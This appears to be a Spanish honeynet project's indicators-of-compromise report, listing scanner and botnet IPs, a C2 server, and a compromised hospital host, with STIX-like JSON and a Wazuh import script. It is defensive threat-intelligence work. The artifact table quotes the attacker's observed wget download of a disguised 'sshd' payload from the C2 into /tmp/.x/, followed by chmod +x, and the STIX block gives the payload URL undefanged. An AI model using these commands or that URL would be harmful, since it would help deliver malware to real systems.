# Indicadores de Compromiso (IoC)

> **Período de captura:** 2026-02-04 → 2026-03-06  
> **Fuente:** HoneyNet Cloud AWS — Cowrie · T-Pot CE · Dionaea  
> **Total de IoC documentados:** 9  
> **Clasificación:** Solo académica y de investigación defensiva

---

## Tabla de Contenidos

1. [Formato y Uso](#1-formato-y-uso)
2. [IoC — Red (IPs y Dominios)](#2-ioc--red-ips-y-dominios)
3. [IoC — Infraestructura C2](#3-ioc--infraestructura-c2)
4. [IoC — Host (Rutas y Artefactos)](#4-ioc--host-rutas-y-artefactos)
5. [IoC en Formato STIX-like](#5-ioc-en-formato-stix-like)
6. [Importar en Wazuh CDB](#6-importar-en-wazuh-cdb)

---

## 1. Formato y Uso

Los IoC documentados aquí tienen **finalidad exclusivamente académica
y de investigación defensiva**. Fueron capturados pasivamente por los
honeypots del proyecto — no se ejecutaron contramedidas activas hacia
ninguna de las IPs documentadas.

### Niveles de confianza

| Nivel | Criterio |
|:------|:---------|
| 🔴 **Alta** | Confirmada por ≥2 feeds TI (AbuseIPDB + GreyNoise/OTX) + comportamiento observado directamente |
| 🟠 **Media** | Confirmada por 1 feed TI + comportamiento observado |
| 🟡 **Baja** | Solo comportamiento observado, sin validación externa |

### Defanging

Las URLs y dominios en este documento están **defanged** para prevenir
activaciones accidentales:

```text
. → [.]  
http → hxxp
```


---

## 2. IoC — Red (IPs y Dominios)

### 🔴 Campaña scan.visionheight.com (H1)

| Campo | Valor |
|:------|:------|
| **Tipo** | IPv4 |
| **IP** | `3.130.168.2` |
| **ASN** | AS16509 — Amazon.com, Inc. |
| **Región** | us-east-2 (Ohio, EE.UU.) |
| **Dominio reverso** | `scan.visionheight[.]com` |
| **AbuseIPDB score** | 100/100 |
| **GreyNoise** | `malicious` |
| **Sensores afectados** | Cowrie · T-Pot CE |
| **Comportamiento** | Scanning multi-protocolo coordinado (SSH, RDP, HTTP) |
| **MITRE** | T1595 · T1046 |
| **Confianza** | 🔴 Alta |
| **Primera vista** | 2026-02-10 |
| **Última vista** | 2026-03-05 |

---

| Campo | Valor |
|:------|:------|
| **Tipo** | IPv4 |
| **IP** | `3.129.187.38` |
| **ASN** | AS16509 — Amazon.com, Inc. |
| **Región** | us-east-2 (Ohio, EE.UU.) |
| **Dominio reverso** | `scan.visionheight[.]com` |
| **AbuseIPDB score** | 100/100 |
| **GreyNoise** | `malicious` |
| **Sensores afectados** | Cowrie · T-Pot CE |
| **Comportamiento** | Scanning multi-protocolo coordinado |
| **MITRE** | T1595 · T1046 |
| **Confianza** | 🔴 Alta |
| **Primera vista** | 2026-02-10 |
| **Última vista** | 2026-03-05 |

---

| Campo | Valor |
|:------|:------|
| **Tipo** | IPv4 |
| **IP** | `18.218.118.203` |
| **ASN** | AS16509 — Amazon.com, Inc. |
| **Región** | us-east-2 (Ohio, EE.UU.) |
| **Dominio reverso** | `scan.visionheight[.]com` |
| **AbuseIPDB score** | 100/100 |
| **GreyNoise** | `malicious` |
| **Sensores afectados** | Cowrie · T-Pot CE |
| **Comportamiento** | Scanning multi-protocolo coordinado |
| **MITRE** | T1595 · T1046 |
| **Confianza** | 🔴 Alta |
| **Primera vista** | 2026-02-10 |
| **Última vista** | 2026-03-05 |

---

### 🔴 Botnet SSH NetInformatik (H2)

| Campo | Valor |
|:------|:------|
| **Tipo** | IPv4 |
| **IP** | `158.51.96.38` |
| **ASN** | NetInformatik Inc. |
| **País** | Desconocido |
| **AbuseIPDB score** | 100/100 — **924 reportes únicos** |
| **GreyNoise** | `malicious` |
| **Sensores afectados** | Cowrie |
| **Comportamiento** | Autenticación exitosa en honeypot → descarga binario camuflado → propagación SSH a 50+ IPs |
| **Sesión Cowrie** | TTY log completo capturado |
| **MITRE** | T1110.001 · T1059 · T1105 · T1021.004 |
| **Confianza** | 🔴 Alta |
| **Primera vista** | 2026-02-20 |
| **Última vista** | 2026-02-20 |

---

### 🟠 Host sanitario comprometido (H3)

| Campo | Valor |
|:------|:------|
| **Tipo** | IPv4 |
| **IP** | `201.187.98.150` |
| **Organización** | Hospital Base Valdivia |
| **País** | Chile 🇨🇱 |
| **AbuseIPDB score** | No confirmado — host legítimo comprometido |
| **Sensores afectados** | Dionaea |
| **Comportamiento** | 64,095 intentos SMB TCP/445 en 24h (2026-03-03) |
| **Clasificación** | Host legítimo con malware activo de propagación |
| **Tipo de malware probable** | EternalBlue / WannaCry (SMB scanning masivo) |
| **MITRE** | T1021.002 · T1046 |
| **Confianza** | 🟠 Media — IoC es el comportamiento, no la IP per se |
| **Primera vista** | 2026-03-03 |
| **Última vista** | 2026-03-03 |

> ⚠️ Esta IP pertenece a infraestructura sanitaria **legítima que ha sido
> comprometida**. No debe ser bloqueada indiscriminadamente ya que
> el actor real es el malware en ese host, no la organización.

---

## 3. IoC — Infraestructura C2

### 🔴 Servidor de descarga de malware (H2)

| Campo | Valor |
|:------|:------|
| **Tipo** | IPv4 (servidor C2) |
| **IP** | `212.192.246.9` |
| **Uso observado** | Servidor de descarga del binario malicioso `sshd` |
| **URL de descarga** | `hxxp://212[.]192[.]246[.]9/sshd` |
| **Descargado desde** | `158.51.96.38` durante sesión Cowrie |
| **Descarga completada** | ❌ No — egress cerrado bloqueó la transferencia |
| **MITRE** | T1105 (Ingress Tool Transfer) |
| **Confianza** | 🔴 Alta |
| **Fecha observación** | 2026-02-20 |

---

| Campo | Valor |
|:------|:------|
| **Tipo** | Dominio |
| **Dominio** | `scan.visionheight[.]com` |
| **Resuelve a** | `3.130.168.2` · `3.129.187.38` · `18.218.118.203` |
| **Uso observado** | Infraestructura de scanning global multi-protocolo |
| **MITRE** | T1595 |
| **Confianza** | 🔴 Alta |

---

## 4. IoC — Host (Rutas y Artefactos)

Estos artefactos fueron observados **dentro del entorno honeypot** (Cowrie).
Son representativos del comportamiento del atacante en sistemas reales.

| Tipo | Valor | Descripción | Confianza |
|:-----|:------|:------------|:---------:|
| Path | `/tmp/.x/` | Directorio de trabajo oculto creado por el bot | 🔴 Alta |
| Filename | `sshd` | Binario malicioso camuflado como servicio SSH | 🔴 Alta |
| Path completo | `/tmp/.x/sshd` | Ubicación del payload tras descarga | 🔴 Alta |
| URL | `hxxp://212[.]192[.]246[.]9/sshd` | URL de descarga del payload | 🔴 Alta |
| Comando | `wget http://[C2]/sshd -O /tmp/.x/sshd` | Comando de descarga observado | 🔴 Alta |
| Comando | `chmod +x /tmp/.x/sshd` | Persistencia post-descarga | 🔴 Alta |

---

## 5. IoC en Formato STIX-like

Formato JSON estructurado para integración con plataformas TI
(MISP, OpenCTI, etc.):

```json
[
  {
    "type": "indicator",
    "id": "indicator--h1-001",
    "name": "scan.visionheight.com — IP 3.130.168.2",
    "pattern_type": "stix",
    "pattern": "[ipv4-addr:value = '3.130.168.2']",
    "confidence": 100,
    "labels": ["malicious-activity", "scanning"],
    "external_references": [
      { "source_name": "abuseipdb", "url": "https://www.abuseipdb.com/check/3.130.168.2" }
    ],
    "kill_chain_phases": [
      { "kill_chain_name": "mitre-attack", "phase_name": "reconnaissance" }
    ],
    "first_seen": "2026-02-10",
    "last_seen": "2026-03-05"
  },
  {
    "type": "indicator",
    "id": "indicator--h1-002",
    "name": "scan.visionheight.com — IP 3.129.187.38",
    "pattern_type": "stix",
    "pattern": "[ipv4-addr:value = '3.129.187.38']",
    "confidence": 100,
    "labels": ["malicious-activity", "scanning"],
    "first_seen": "2026-02-10",
    "last_seen": "2026-03-05"
  },
  {
    "type": "indicator",
    "id": "indicator--h1-003",
    "name": "scan.visionheight.com — IP 18.218.118.203",
    "pattern_type": "stix",
    "pattern": "[ipv4-addr:value = '18.218.118.203']",
    "confidence": 100,
    "labels": ["malicious-activity", "scanning"],
    "first_seen": "2026-02-10",
    "last_seen": "2026-03-05"
  },
  {
    "type": "indicator",
    "id": "indicator--h2-001",
    "name": "Botnet SSH — 158.51.96.38",
    "pattern_type": "stix",
    "pattern": "[ipv4-addr:value = '158.51.96.38']",
    "confidence": 100,
    "labels": ["malicious-activity", "botnet", "credential-access"],
    "external_references": [
      { "source_name": "abuseipdb", "description": "924 unique reporters, score 100/100" }
    ],
    "kill_chain_phases": [
      { "kill_chain_name": "mitre-attack", "phase_name": "credential-access" },
      { "kill_chain_name": "mitre-attack", "phase_name": "execution" }
    ],
    "first_seen": "2026-02-20",
    "last_seen": "2026-02-20"
  },
  {
    "type": "indicator",
    "id": "indicator--h2-002",
    "name": "C2 servidor malware — 212.192.246.9",
    "pattern_type": "stix",
    "pattern": "[ipv4-addr:value = '212.192.246.9']",
    "confidence": 95,
    "labels": ["malicious-activity", "c2", "malware-distribution"],
    "kill_chain_phases": [
      { "kill_chain_name": "mitre-attack", "phase_name": "command-and-control" }
    ],
    "first_seen": "2026-02-20",
    "last_seen": "2026-02-20"
  },
  {
    "type": "indicator",
    "id": "indicator--h2-003",
    "name": "URL descarga payload — /sshd",
    "pattern_type": "stix",
    "pattern": "[url:value = 'http://212.192.246.9/sshd']",
    "confidence": 95,
    "labels": ["malicious-activity", "dropper"],
    "kill_chain_phases": [
      { "kill_chain_name": "mitre-attack", "phase_name": "execution" }
    ],
    "first_seen": "2026-02-20",
    "last_seen": "2026-02-20"
  },
  {
    "type": "indicator",
    "id": "indicator--h3-001",
    "name": "SMB propagation — 201.187.98.150 (compromised host)",
    "pattern_type": "stix",
    "pattern": "[ipv4-addr:value = '201.187.98.150']",
    "confidence": 60,
    "labels": ["compromised", "smb-scanning"],
    "description": "Infraestructura sanitaria comprometida. IoC es el comportamiento, no la organización.",
    "kill_chain_phases": [
      { "kill_chain_name": "mitre-attack", "phase_name": "lateral-movement" }
    ],
    "first_seen": "2026-03-03",
    "last_seen": "2026-03-03"
  }
]
```

---

## 6. Importar en Wazuh CDB

Para agregar estos IoC directamente a la CDB activa del Manager:

```bash
# En el Wazuh Manager
sudo tee -a /var/ossec/etc/lists/honeynet-ti-ip.enriched.top200 << 'EOF'
3.130.168.2:high
3.129.187.38:high
18.218.118.203:high
158.51.96.38:high
212.192.246.9:high
201.187.98.150:medium
EOF

# Recargar el Manager para aplicar cambios
sudo systemctl restart wazuh-manager

# Verificar
grep -c "." /var/ossec/etc/lists/honeynet-ti-ip.enriched.top200
```

## Referencias

- [Análisis de Hallazgos](cloud-honeynet-aws/docs/03-analisis/hallazgos)
    
- [AbuseIPDB — 158.51.96.38](https://www.abuseipdb.com/check/158.51.96.38)
    
- [AbuseIPDB — 3.130.168.2](https://www.abuseipdb.com/check/3.130.168.2)
    
- [MITRE ATT&CK — Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)
    
- [STIX 2.1 — Indicator Object](https://docs.oasis-open.org/cti/stix/v2.1/stix-v2.1.html)

